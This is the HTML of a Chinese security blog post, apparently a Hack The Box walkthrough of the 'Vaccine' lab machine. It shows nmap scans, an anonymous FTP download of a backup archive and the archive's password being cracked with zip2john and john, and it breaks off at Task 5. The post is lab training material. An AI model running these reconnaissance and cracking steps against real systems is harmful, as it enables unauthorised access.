@@ -1,0 +1,1265 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Tier 2 第 1 台">
+<title>10. Vaccine</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/10.-vaccine/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="10. Vaccine">
+<meta property='og:description' content="Tier 2 第 1 台">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/10.-vaccine/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-04T16:57:30&#43;08:00'/><meta property='article:modified_time' content='2026-11-04T16:57:30&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/10.-vaccine/assets/image-20261103145307240.png' />
+<meta name="twitter:title" content="10. Vaccine">
+<meta name="twitter:description" content="Tier 2 第 1 台"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/10.-vaccine/assets/image-20261103145307240.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#task-1">Task 1</a></li>
+        <li><a href="#task-2">Task 2</a></li>
+        <li><a href="#task-3">Task 3</a></li>
+        <li><a href="#task-4">Task 4</a></li>
+        <li><a href="#task-5">Task 5</a></li>
+        <li><a href="#task-6">Task 6</a></li>
+        <li><a href="#task-7">Task 7</a></li>
+        <li><a href="#submit-user-flag">Submit User Flag</a></li>
+        <li><a href="#submit-root-flag">Submit Root Flag</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/10.-vaccine/">
+                <img src="/p/10.-vaccine/assets/image-20261103145307240_hu3437655965950315806.png"
+                        srcset="/p/10.-vaccine/assets/image-20261103145307240_hu3437655965950315806.png 800w, /p/10.-vaccine/assets/image-20261103145307240_hu13806361452983870351.png 1600w"
+                        width="800" 
+                        height="322" 
+                        loading="lazy"
+                        alt="Featured image of post 10. Vaccine" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/very-easy/" >
+                Very Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/10.-vaccine/">10. Vaccine</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Tier 2 第 1 台
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-04</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="vaccine">Vaccine
+</h1><p><img src="/p/10.-vaccine/assets/image-20261103145307240.png"
+	width="469"
+	height="189"
+	srcset="/p/10.-vaccine/assets/image-20261103145307240_hu5248173674718905064.png 480w, /p/10.-vaccine/assets/image-20261103145307240_hu11710041863674503608.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261103145307240"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="248"
+		data-flex-basis="595px"
+	
+></p>
+<p>About: Vaccine is a very easy Linux machine that emphasizes enumeration and password cracking. Anonymous FTP access exposes a password-protected backup archive which can be cracked to recover web application credentials. These credentials grant access to a PHP application vulnerable to SQL injection which leads to command execution and an initial shell as the postgres user. Finally, privilege escalation can be achieved by abusing misconfigured sudo permissions on vi.</p>
+<p>介绍：Vaccine 是一个非常简单的 Linux 机器，它侧重于枚举和密码破解。匿名 FTP 访问会暴露受密码保护的备份存档，破解该存档可以恢复 Web 应用程序凭据。这些凭证允许访问存在 SQL 注入漏洞的 PHP 应用程序，从而导致命令执行并以 postgres 用户身份获得初始 shell。最后，可以通过滥用 vi 中配置错误的 sudo 权限来实现权限提升。</p>
+<p>靶机 IP：10.129.94.134</p>
+<h3 id="task-1">Task 1
+</h3><blockquote>
+<p>Besides SSH and HTTP, what other service is hosted on this box?</p>
+<p>除了 SSH 和 HTTP 之外，这台服务器上还托管了哪个其他服务？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -n 10.129.94.134   
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-03 01:55 -0500
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.94.134
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.66s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">21/tcp open  ftp
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 3.93 seconds
+</span></span><span class="line"><span class="cl">         
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -n -p 21,22,80 -sV -sC 10.129.94.134
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-03 01:56 -0500
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.94.134
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to ::ffff:10.10.16.102
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftpuser
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      At session startup, client count was <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-rwxr-xr-x    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">2533</span> Apr <span class="m">13</span>  <span class="m">2021</span> backup.zip
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: MegaCorp Login
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   /: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 31.35 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：ftp</strong></p>
+<h3 id="task-2">Task 2
+</h3><blockquote>
+<p>This service can be configured to allow login with any password for specific username. What is that username?</p>
+<p>此服务可以配置为允许使用任意密码登录特定用户名。请问该用户名是什么？</p>
+</blockquote>
+<p>根据扫描结果中的 <code>ftp-anon: Anonymous FTP login allowed (FTP code 230)</code> 可知可以使用 anonymous 进行匿名登录。</p>
+<p><strong>答案：anonymous</strong></p>
+<h3 id="task-3">Task 3
+</h3><blockquote>
+<p>What is the name of the file downloaded over this service?</p>
+<p>通过此服务下载的文件的名称是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ftp -a 10.129.94.134
+</span></span><span class="line"><span class="cl">Connected to 10.129.94.134.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
+</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; ls
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>10791<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
+</span></span><span class="line"><span class="cl">-rwxr-xr-x    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">2533</span> Apr <span class="m">13</span>  <span class="m">2021</span> backup.zip
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
+</span></span><span class="line"><span class="cl">ftp&gt; get backup.zip
+</span></span><span class="line"><span class="cl">local: backup.zip remote: backup.zip
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>10304<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> backup.zip <span class="o">(</span><span class="m">2533</span> bytes<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>****************************************************<span class="p">|</span>  <span class="m">2533</span>       11.04 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
+</span></span><span class="line"><span class="cl"><span class="m">2533</span> bytes received in 00:00 <span class="o">(</span>2.53 KiB/s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="m">221</span> Goodbye.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过 <code>-a</code> 进行匿名登录。</p>
+<p><code>ls</code> 发现 <code>backup.zip</code> 文件，<code>get</code> 下载文件到本地。</p>
+<p><strong>答案：backup.zip</strong></p>
+<h3 id="task-4">Task 4
+</h3><blockquote>
+<p>What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?</p>
+<p>John The Ripper 工具集中包含哪个脚本，能够从受密码保护的 zip 压缩包中生成哈希值，并且生成格式允许进行破解尝试？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# unzip backup.zip  
+</span></span><span class="line"><span class="cl">Archive:  backup.zip
+</span></span><span class="line"><span class="cl"><span class="o">[</span>backup.zip<span class="o">]</span> index.php password: 
+</span></span><span class="line"><span class="cl">   skipping: index.php               incorrect password
+</span></span><span class="line"><span class="cl">   skipping: style.css               incorrect password
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# zip2john backup.zip &gt; zip.hash
+</span></span><span class="line"><span class="cl">ver 2.0 efh <span class="m">5455</span> efh <span class="m">7875</span> backup.zip/index.php PKZIP Encr: TS_chk, <span class="nv">cmplen</span><span class="o">=</span>1201, <span class="nv">decmplen</span><span class="o">=</span>2594, <span class="nv">crc</span><span class="o">=</span>3A41AE06 <span class="nv">ts</span><span class="o">=</span><span class="m">5722</span> <span class="nv">cs</span><span class="o">=</span><span class="m">5722</span> <span class="nv">type</span><span class="o">=</span><span class="m">8</span>
+</span></span><span class="line"><span class="cl">ver 2.0 efh <span class="m">5455</span> efh <span class="m">7875</span> backup.zip/style.css PKZIP Encr: TS_chk, <span class="nv">cmplen</span><span class="o">=</span>986, <span class="nv">decmplen</span><span class="o">=</span>3274, <span class="nv">crc</span><span class="o">=</span>1B1CCD6A <span class="nv">ts</span><span class="o">=</span>989A <span class="nv">cs</span><span class="o">=</span>989a <span class="nv">type</span><span class="o">=</span><span class="m">8</span>
+</span></span><span class="line"><span class="cl">NOTE: It is assumed that all files in each archive have the same password.
+</span></span><span class="line"><span class="cl">If that is not the <span class="k">case</span>, the <span class="nb">hash</span> may be uncrackable. To avoid this, use
+</span></span><span class="line"><span class="cl">option -o to pick a file at a time.
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# john zip.hash                                                                
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">4</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Proceeding with single, rules:Single
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">Almost <span class="k">done</span>: Processing the remaining buffered candidate passwords, <span class="k">if</span> any.
+</span></span><span class="line"><span class="cl">Proceeding with wordlist:/usr/share/john/password.lst
+</span></span><span class="line"><span class="cl"><span class="m">741852963</span>        <span class="o">(</span>backup.zip<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE 2/3 <span class="o">(</span>2026-11-03 02:05<span class="o">)</span> 20.00g/s 1536Kp/s 1536Kc/s 1536KC/s 123456..ferrises
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed. 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>unzip</code> 用于解密 zip 压缩包，但是发现需要密码。</p>
+<p>通过 <code>zip2john</code> 提取加密 ZIP 的校验信息，输出为 John 可识别的 <code>$pkzip$</code> 格式哈希，就可以让 john 进行破解。</p>
+<p><strong>答案：zip2john</strong></p>
+<h3 id="task-5">Task 5
+</h3><blockquote>
+<p>What is the password for the admin user on the website?</p>
+<p>网站管理员用户的密码是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
